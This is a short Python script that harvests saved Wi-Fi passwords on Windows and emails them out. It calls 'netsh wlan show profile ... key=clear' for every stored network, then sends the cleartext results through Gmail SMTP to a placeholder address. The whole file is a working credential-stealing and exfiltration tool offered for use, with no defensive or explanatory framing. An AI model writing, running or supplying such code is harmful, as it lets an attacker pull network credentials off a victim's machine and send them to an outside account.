#!/usr/bin/env python

import subprocess, smtplib, re

# Defines where to send the email
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# Returns all saved wifi SSIDs
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks.decode('utf-8'))

# Loops through all saved wifi SSIDs, revealing each wifi password, then mailing it to specified gmail account
result =""
for network_name in network_names_list:
    # Added quotes around network_name to handle spaces in SSID
    command = "netsh wlan show profile " +'"'+network_name+'"'+ " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + str(current_result)
#print(result)
send_mail("yourgmail@gmail.com", "youremailpassword", result)